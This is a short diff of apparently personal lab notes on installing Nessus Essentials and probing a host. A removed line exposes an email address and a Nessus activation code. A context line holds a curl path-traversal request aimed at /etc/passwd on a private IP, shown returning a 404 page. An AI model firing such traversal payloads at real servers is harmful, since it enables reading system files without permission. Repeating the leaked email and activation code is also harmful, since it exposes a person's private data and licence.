@@ -29,8 +29,8 @@ sudo systemctl start nessusd.service
 
 https://127.0.0.1:8834
 Nessus Essentials
-leefrk17@gmail.com
-Activation Code: 7QZU-8K4T-Q6MP-HFLR-XD38
+@gmail.com
+Activation Code:
 admin/ (activation failed !)
 
 discovery, compliance, vulnerability
@@ -80,6 +80,7 @@ curl http://192.168.54.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 <p>The requested URL was not found on this server.</p>
 </body></html>
  
+
 
 
 
